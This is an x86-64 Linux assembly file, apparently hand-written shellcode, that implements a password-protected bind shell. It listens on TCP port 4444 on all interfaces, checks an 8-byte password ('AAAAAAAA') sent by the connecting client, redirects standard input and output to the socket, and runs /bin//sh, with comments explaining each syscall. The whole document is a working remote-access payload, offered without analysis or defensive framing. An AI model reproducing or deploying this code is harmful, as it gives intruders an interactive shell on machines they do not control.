global _start


_start:

	; sock = socket(AF_INET, SOCK_STREAM, 0)
	; AF_INET = 2
	; SOCK_STREAM = 1
	; syscall number 41 


	xor rdi, rdi
	xor rsi, rsi
	mov al, 41
	mov dil, 2
	mov sil, 1
	xor rdx, rdx
	syscall

	; copy socket descriptor to rdi for future use 

	mov rdi, rax


	; server.sin_family = AF_INET 
	; server.sin_port = htons(PORT)
	; server.sin_addr.s_addr = INADDR_ANY
	; bzero(&server.sin_zero, 8)

	xor rax, rax 

	push rax

	mov dword [rsp-4], eax
	mov word [rsp-6], 0x5c11
	xor r15, r15
	add r15, 2
	mov word [rsp-8],r15w

	;mov byte [rsp-8], 0x2
	sub rsp, 8


	; bind(sock, (struct sockaddr *)&server, sockaddr_len)
	; syscall number 49

	mov al, 49
	
	mov rsi, rsp
	mov dl, 16
	syscall


	; listen(sock, MAX_CLIENTS)
	; syscall number 50

	mov al, 50
	xor rsi, rsi
	mov sil, 2
	syscall


	; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
	; syscall number 43

	
	mov al, 43
	sub rsp, 16
	mov rsi, rsp
        mov byte [rsp-1], 16
        sub rsp, 1
        mov rdx, rsp

        syscall

	; store the client socket description 
	mov r9, rax 

        ; close parent

        mov al, 3
        syscall

        ; duplicate sockets

        ; dup2 (new, old)
        mov rdi, r9
        mov al, 33
        xor rsi, rsi
        syscall

        mov al, 33
        mov sil, 1
        syscall

        mov al, 33
        mov sil, 2
        syscall

	;password read and compare section, exit if not same
	;password is "AAAAAAAA"
	mov rbx, 0x4141414141414141

	;read syscall and check for passphrase
        ;ssize_t read(int fd, void *buf, size_t count);
        ;fd = r9 in rdi
        mov rdi, r9

	;buf = ... in rsi
        sub rsp,8       ;place for read pw
        mov rsi,rsp

	;sycallnumber 0 in rax
        xor rax,rax

	;count = ... in rdx
        xor rdx,rdx
        add rdx,8

        syscall

	 ;compare result, if not same exit gracefully
        cmp rbx, [rsi]   ; if same then ZF tripped
        jnz exit    ;if not the same do exit module, otherwise continue

	

        ; execve

        ; First NULL push

        xor rax, rax
        push rax

        ; push /bin//sh in reverse

        mov rbx, 0x68732f2f6e69622f
        push rbx

        ; store /bin//sh address in RDI

        mov rdi, rsp

        ; Second NULL push
        push rax

        ; set RDX
        mov rdx, rsp


        ; Push address of /bin//sh
        push rdi

        ; set RSI

        mov rsi, rsp

        ; Call the Execve syscall
        add rax, 59
        syscall

exit:
	xor rax, rax
	xor rdi, rdi
	mov rax, 60
	mov rdi, 11
	syscall
